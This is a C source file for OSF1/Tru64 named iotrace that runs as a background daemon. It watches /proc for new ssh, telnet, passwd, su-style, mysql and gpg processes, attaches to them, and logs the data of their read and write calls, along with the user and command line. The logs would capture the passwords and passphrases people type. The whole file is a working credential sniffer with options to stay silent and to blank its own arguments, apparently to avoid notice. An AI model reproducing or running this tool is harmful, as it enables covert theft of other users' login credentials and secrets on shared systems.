/*
 * $Id: iotrace-OSF1.c,v 1.5 2004/12/25 13:50:51 xenion Exp $
 *
 * Copyright (c) 2004 Dallachiesa Michele <michele.dallachiesa at poste.it>
 *
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification are permitted.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * osf1_v40: 'cc -lrt -ldb iotrace-OSF1.c -o iotrace'
 * osf1_v50: 'cc -lrt iotrace-OSF1.c -o iotrace'
 *
 * THANKS: Sat, hacking on trace src :)
 *
 * CHANGELOG
 * 20/04/2004  the tracing scheme has been improved (no childs, only 1 daemon
 *             process) and some misc bugs have been fixed
 * ??/01/2004  first release
 * 
 */

#include <sys/types.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <string.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/procfs.h>
#include <pwd.h>
#include <machine/reg.h>
#include <sys/time.h>


// monitored commands (comm)
#define MONITORED_CMDS               \
  "ssh",  "sshd", "ftp",             \
  "telnet",  "rsh",  "scp",  "rcp",  \
  "rlogin",  "rexec",  "passwd",     \
  "adduser",  "mysql", "gpg"


#define MAX_IOLEN 128		// max i/o length. with -c you can set a
				// lower value.. try with 1 :>
#define PROC_TRACE_TIMEOUT 5	// trace i/o just for 20 seconds
#define MSECSLEEP 200000	// check for new processes every 1/5
				// seconds
#define BUFLEN   128		// size for buf, multi-purpose buffer

#define PREFIX_PROCLOG "trace"
#define PREFIX_DAEMONLOG "daemon"

#define ID0 "IOTRACE " VER "OSF1"

#define SAFE_FCLOSE(x) do{ if(x) { fclose(x); x = NULL; } }while(0)
#define SAFE_CLOSE(x) do{ if(x) { close(x); x = -1; } }while(0)

#define MSECIN1SEC 1000000
#define MAX_PROCS 64

#define SIGSTR(x) x == SIGURG  ? "SIGURG"  : \
                  x == SIGPIPE ? "SIGPIPE" : \
                  x == SIGQUIT ? "SIGQUIT" : \
                  x == SIGINT  ? "SIGINT"  : \
                  x == SIGTERM ? "SIGTERM" : \
                  x == SIGHUP  ? "SIGHUP"  : \
                  x == SIGSEGV ? "SIGSEGV" : \
                  x == SIGBUS  ? "SIGBUS"  : \
                  x == SIGALRM ? "SIGALRM" : "UNKWOWN"

// returns 1 if a > b, -1 if a < b, 0 if a == b
#define myrealtimercmp(a, b) (         \
   a.tv_sec > b.tv_sec ? 1 :           \
   a.tv_sec < b.tv_sec ? -1 :          \
   a.tv_usec > b.tv_usec ? 1 :         \
   a.tv_usec < b.tv_usec ? -1 : 0 )

#define mytimersub(a, b, result)                           \
  do {                                                     \
    (result)->tv_sec = (a)->tv_sec - (b)->tv_sec;          \
    (result)->tv_usec = (a)->tv_usec - (b)->tv_usec;       \
    if ((result)->tv_usec < 0) {                           \
      --(result)->tv_sec;                                  \
      (result)->tv_usec += 1000000;                        \
    }                                                      \
  } while (0)


typedef struct {
    char            dir[PATH_MAX];
    int             max_rw_len;
    int             silent;
} OPT;


typedef struct ktraced_proc {
    pid_t           pid;
    int             fd;
    FILE           *log;
    struct timeval  tv;
} traced_proc_t;


prusage_t      *getpsusage(pid_t pid);
void            procs_del(int id);
int             procs_look_and_add();
void            procs_update();
void            procs_handle_exc(int id);
void            fatal(char *, ...);
void            help();
void            init_opt(int, char **);
void            die(int);
void            mylog(const char *format, ...);
FILE           *myfopen(const char *mode, char *pattern, ...);
FILE           *fopennlog(const char *dir, const char *prefix);


char            buf[BUFLEN];
OPT             o;
FILE           *flog;
char           *monitored[] = { MONITORED_CMDS, NULL };
struct timeval  last_proc_tv;
traced_proc_t   procs[MAX_PROCS];
int             nprocs;



int
main(int argc, char **argv)
{
    int             i,
                    mx;
    fd_set          exc_set;
    struct timeval  tv0,
                    tv1,
                    tv;
    prusage_t      *psusage;

    if (argc == 1)
	help();
    init_opt(argc, argv);

    if (fork())
	exit(0);
    setsid();
    umask(0);

    signal(SIGTERM, die);
    signal(SIGINT, die);
    signal(SIGSEGV, die);

#ifdef DEBUG
    mylog("DEBUG enabled");
#endif

#ifdef DEBUG
    mylog("max_rw_len: %d", o.max_rw_len);
#endif

    fprintf(flog, "monitoring: ");
    for (i = 0; monitored[i]; ++i)
	fprintf(flog, "%s ", monitored[i]);
    fprintf(flog, "\n");
    fflush(flog);		// we flush ONLY flog.

    /*
     * initializing last_proc_tv..
     */

    psusage = getpsusage(getpid());
    if (psusage == NULL)
	fatal("getpsusage: %s", strerror(errno));

    last_proc_tv.tv_sec = psusage->pr_create.tv_sec;
    // nanoseconds to microseconds
    last_proc_tv.tv_usec = psusage->pr_create.tv_nsec / 1000;

    // initializing procs array..

    for (i = 0; i < MAX_PROCS; i++)
	procs[i].fd = -1;

    gettimeofday(&tv0, NULL);

    for (;;) {

	mx = 0;
	FD_ZERO(&exc_set);

	tv.tv_sec = 0;
	tv.tv_usec = MSECSLEEP;

	for (i = 0; i < MAX_PROCS; i++)
	    if (procs[i].fd != -1) {
		FD_SET(procs[i].fd, &exc_set);
		if (procs[i].fd > mx)
		    mx = procs[i].fd;
	    }

	i = select(mx + 1, NULL, NULL, &exc_set, &tv);

	if (i == -1)
	    fatal("select: %s", strerror(errno));

	// the value of tv is not documented in the manpage, so not used.. 
	// 
	// 
	// 
	// 
	// 
	// 

	gettimeofday(&tv1, NULL);
	mytimersub(&tv1, &tv0, &tv);	// tv = tv1 - tv0

	if (tv.tv_sec >= 1) {	// TRUE every second
	    gettimeofday(&tv0, NULL);
	    procs_update();	// check expired timers
	}
	// TRUE every MSECSLEEP microseconds
	if (tv.tv_sec >= 1 || tv.tv_usec >= MSECSLEEP)
	    procs_look_and_add();

	if (i > 0)		// there're exceptions to handle
	    for (i = 0; i < MAX_PROCS; i++)
		if (procs[i].fd != -1 && FD_ISSET(procs[i].fd, &exc_set))
		    procs_handle_exc(i);	// handles the exception 
    }

    return 0;			/* never reached */
}


void
fatal(char *pattern, ...)
{
    va_list         ap;


    if (flog == NULL && !o.silent)
	flog = stdout;

    if (flog) {
	va_start(ap, pattern);
	vfprintf(flog, pattern, ap);
	va_end(ap);
	fprintf(flog, "\n");
    }
    die(SIGTERM);
}



FILE           *
myfopen(const char *mode, char *pattern, ...)
{
    va_list         ap;
    char            path[PATH_MAX];
    int             z;
    FILE           *f;


    va_start(ap, pattern);
    z = vsnprintf(path, PATH_MAX - 1, pattern, ap);
    va_end(ap);

    if (z == -1)
	return NULL;

    path[PATH_MAX - 1] = '\0';

    f = fopen(path, mode);

    return f;
}



void
init_opt(int argc, char **argv)
{
    int             c;

    o.dir[0] = '\0';
    o.max_rw_len = MAX_IOLEN;
    o.silent = 0;

    while ((c = getopt(argc, argv, "l:c:sV")) != EOF)
	switch (c) {

	case 'l':
	    strncpy(o.dir, optarg, PATH_MAX - 1);
	    o.dir[PATH_MAX - 1] = '\0';
	    break;

	case 'c':
	    o.max_rw_len = atoi(optarg);
	    break;

	case 's':
	    o.silent = 1;
	    break;

	case 'V':
	    printf("%s\n", ID0);
#ifdef DEBUG
	    printf("(DEBUG defined)\n");
#endif
	    exit(0);

	default:
	    exit(0);

	}

    if (o.dir[0] == '\0')
	fatal("logs directory required");

    // fopennlog checks the dir
    flog = fopennlog(o.dir, PREFIX_DAEMONLOG);
    if (!flog)
	fatal("fopennlog(): %s", strerror(errno));

    if (o.max_rw_len < 0 || o.max_rw_len > BUFLEN)
	fatal("max_rw_len too big or negative");

    for (c = 1; c < argc; ++c)
	memset(argv[c], '\0', strlen(argv[c]));
}


void
help()
{
    int             i,
                    c;

    printf("USAGE: iotrace [options]\n\n");
    printf(" -l path          The logs directory\n");
    printf
	(" -c count         Ignore I/O if length is greater than <count>\n");
    printf("                  bytes (default is %d)\n", MAX_IOLEN);
    printf(" -s               Be totally silent on stdout/stderr\n");
    printf(" -V               Display version information\n\n");


    printf("Monitoring: ");
    c = 12;
    for (i = 0; monitored[i]; ++i) {
	c += strlen(monitored[i]) + 2;
	if (c > 70) {
	    c = 0;
	    printf("\n");
	}
	printf("%s%c ", monitored[i], monitored[i + 1] ? ',' : '.');
    }
    printf("\n\n");
    exit(0);
}


void
die(int signo)
{
    int             i;

    mylog("caught %s(%d) signal, cleaning up", SIGSTR(signo), signo);

    if (nprocs != 0)
	for (i = 0; i < MAX_PROCS; i++)
	    if (procs[i].fd != -1)
		procs_del(i);

    SAFE_FCLOSE(flog);
    exit(0);
}


void
mylog(const char *format, ...)
{
    va_list         ap;

    if (flog) {
	va_start(ap, format);
	vfprintf(flog, format, ap);
	va_end(ap);
	fprintf(flog, "\n");
	fflush(flog);
    }
}


FILE           *
fopennlog(const char *dir, const char *prefix)
{
    int             fd;
    static char     res_pathname[PATH_MAX];
    static unsigned long index = 0;
    struct stat     mystat;

    if (stat(dir, &mystat) != 0 || !S_ISDIR(mystat.st_mode))
	fatal("%s does not exist or it isn't a directory", dir);

    for (;;) {
	snprintf(res_pathname, PATH_MAX, "%s/%s%ld", dir, prefix, index);
	fd = open(res_pathname,
		  O_CREAT | O_EXCL | O_RDWR | S_IRUSR | S_IWUSR);
	if (fd != -1)
	    break;
	index++;
    }

    return fdopen(fd, "w");

}


int
procs_look_and_add()
{
    DIR            *proc_dir;
    struct dirent  *proc_entry;
    struct timeval  tv;
    char           *p;
    int             z,
                    i,
                    fd = -1;
    prpsinfo_t      psinfo;
    prusage_t       psusage;
    sysset_t        sysmask;
    struct passwd  *pwd;
    int             procid;


    // mylog("procs_look_and_add called");

    for (procid = 0; procid < MAX_PROCS; procid++)
	if (procs[procid].fd == -1)
	    break;

    if (procid == MAX_PROCS)	// no free slots!
	return;

    // look for a suitable target..

    if ((proc_dir = opendir("/proc")) == NULL)
	fatal("unable to open /proc: %s", strerror(errno));

    fd = -1;

    while ((proc_entry = readdir(proc_dir))) {

	SAFE_CLOSE(fd);

	for (p = proc_entry->d_name; *p; ++p)
	    if (*p < '0' || *p > '9')
		break;
	if (*p)
	    continue;

	sprintf(buf, "/proc/%s", proc_entry->d_name);
	fd = open(buf, O_RDWR);

	if (fd < 0)
	    continue;

	// check if it's a NEW process

	z = ioctl(fd, PIOCUSAGE, &psusage);
	if (z < 0)
	    continue;

	// psinfo.pr_start doesn't change 'quickly'.. fuck.
	// we'll use psusage.pr_create instead.

	tv.tv_sec = psusage.pr_create.tv_sec;
	tv.tv_usec = psusage.pr_create.tv_nsec / 1000;

	if (myrealtimercmp((tv), last_proc_tv) != 1)
	    continue;

	// yes, it is. check if it's an INTERESTING process

	z = ioctl(fd, PIOCPSINFO, &psinfo);

	if (z < 0)
	    continue;

	z = 0;
	for (i = 0; monitored[i]; ++i)
	    if (strcmp(psinfo.pr_fname, monitored[i]) == 0) {
		z = 1;
		break;
	    }
	if (z == 0)
	    continue;

	// yes, it is. Update last_proc_tv and add process

	last_proc_tv.tv_sec = tv.tv_sec;
	last_proc_tv.tv_usec = tv.tv_usec;

#ifdef DEBUG
	mylog("target: %s (pid=%s)", psinfo.pr_fname, proc_entry->d_name);
#endif

	closedir(proc_dir);

	// we've our target!

	procs[procid].log = fopennlog(o.dir, PREFIX_PROCLOG);
	if (!procs[procid].log)
	    fatal("fopennlog(): %s", strerror(errno));


	procs[procid].pid = atoi(proc_entry->d_name);
	procs[procid].tv.tv_sec = psusage.pr_create.tv_sec;
	procs[procid].tv.tv_usec = psusage.pr_create.tv_nsec / 1000;
	procs[procid].fd = fd;
	nprocs++;

	// if we're here psinfo refers to the target proc
	fprintf(procs[procid].log, "cmdline: %s\n", psinfo.pr_psargs);

	/*
	 * me must know who's the user.. ssh uses the user as username if
	 * nothing else is specified.
	 */

	if ((pwd = getpwuid(psinfo.pr_uid)) != NULL)
	    fprintf(procs[procid].log, "user: %s\n\n", pwd->pw_name);

	// start tracing!

	premptyset(&sysmask);
	praddset(&sysmask, SYS_read);
	praddset(&sysmask, SYS_write);
	praddset(&sysmask, SYS_fork);
	praddset(&sysmask, SYS_exit);
	praddset(&sysmask, SYS_execve);

	if (ioctl(fd, PIOCSRLC, 0) == -1)
	    fatal("unable to ioctl PIOCSRLC: %s", strerror(errno));
	if (ioctl(fd, PIOCSENTRY, &sysmask) == -1)
	    fatal("unable to ioctl PIOCSENTRY: %s", strerror(errno));
	if (ioctl(fd, PIOCSEXIT, &sysmask) == -1)
	    fatal("unable to ioctl PIOCSEXIT: %s", strerror(errno));

	mylog("added pid %d", procs[procid].pid);

	return procid;
    }


    // no target

    SAFE_CLOSE(fd);
    closedir(proc_dir);
    return NULL;

}


void
procs_handle_exc(int id)
{
    prstatus_t      pstatus;
    gregset_t       regs;
    long           *p;
    int             count;

    if (ioctl(procs[id].fd, PIOCWSTOP, &pstatus) == -1)
	fatal("unable to ioctl PIOCWSTOP: %s", strerror(errno));

    if (!(pstatus.pr_flags & PR_ISTOP))
	fatal("not stopped after PIOCWSTOP");

    if (ioctl(procs[id].fd, PIOCGREG, &regs) == -1)
	fatal("unable to ioctl PIOCGREG");

    if (pstatus.pr_why == PR_SYSENTRY) {

    } else if (pstatus.pr_why == PR_SYSEXIT) {

	// from the GREAT trace sources:
	/*
	 * The next bit is hairy. The system call has failed, and register 0
	 * contains errno rather than the return value, _if_ EF_T8 is 1 
	 * Why EF_T8? Because thats how it works, as verified by
	 * disassembling syscall.o :-)
	 */

	if (regs.regs[EF_T8] != 1 && (int) (regs.regs[0]) != -1)
	    switch (pstatus.pr_what) {

	    case SYS_fork:

		fprintf(procs[id].log, "@SYS_fork@pid:%d", regs.regs[0]);
		break;

	    case SYS_read:
	    case SYS_write:

		p = &regs.regs[EF_A3];

		if (pstatus.pr_what == SYS_read)
		    count = regs.regs[0];	// ret. value
		else		// SYS_write
		    count = p[2];	// param

#ifdef DEBUG
		mylog("%s: len %ld fd %d",
		      pstatus.pr_what == SYS_read ? "read" : "write",
		      count, p[0]);
#endif

		if (count <= 0 || count > BUFLEN)
		    break;

		// if not stdin/stdout/stderr and if too big

		if (p[0] < 0 || p[0] > 2)
		    if (count > o.max_rw_len)
			break;


		lseek(procs[id].fd, p[1], SEEK_SET);
		read(procs[id].fd, buf, count);
		fwrite(buf, 1, count, procs[id].log);
		break;

	    case SYS_execve:
		fprintf(procs[id].log, "@SYS_execve@");
		break;

	    case SYS_exit:
		fprintf(procs[id].log, "@SYS_exit@");
		// we must exit.. otherwise the next ioctl will segv.
		// iouha! ;)
		procs_del(id);
		return;
	    }

    }

    if (ioctl(procs[id].fd, PIOCRUN, 0) == -1)
	fatal("unable to ioctl PIOCRUN");

}


void
procs_update()
{
    struct timeval  tv,
                    tmp;
    int             id;


#ifdef DEBUG
    mylog("updating procs (nprocs=%d)", nprocs);
#endif

    if (nprocs == 0)
	return;

    gettimeofday(&tv, NULL);

    for (id = 0; id < MAX_PROCS; id++) {

	// it 's a free slot ?
	if (procs[id].fd == -1)
	    continue;

	// the timer isn 't exired ?
	mytimersub(&tv, &procs[id].tv, &tmp);
	if (tmp.tv_sec <= PROC_TRACE_TIMEOUT)
	    continue;

	// the timer expired !

#ifdef DEBUG
	mylog("timer expired for pid %d", procs[id].pid);
#endif

	// freeing slot...
	procs_del(id);
    }

}


void
procs_del(int id)
{
    if (procs[id].fd == -1)	// non dovrebbe mai succedere..
	fatal("can't remove a free slot!");
    SAFE_CLOSE(procs[id].fd);
    SAFE_FCLOSE(procs[id].log);
    nprocs--;
    mylog("removed pid %d", procs[id].pid);
}



prusage_t      *
getpsusage(pid_t pid)
{
    static prusage_t psusage;
    int             z,
                    fd;

    sprintf(buf, "/proc/%d", pid);
    fd = open(buf, O_RDONLY);

    if (fd == -1)
	return NULL;

    z = ioctl(fd, PIOCUSAGE, &psusage);

    close(fd);

    return z == -1 ? NULL : &psusage;

}
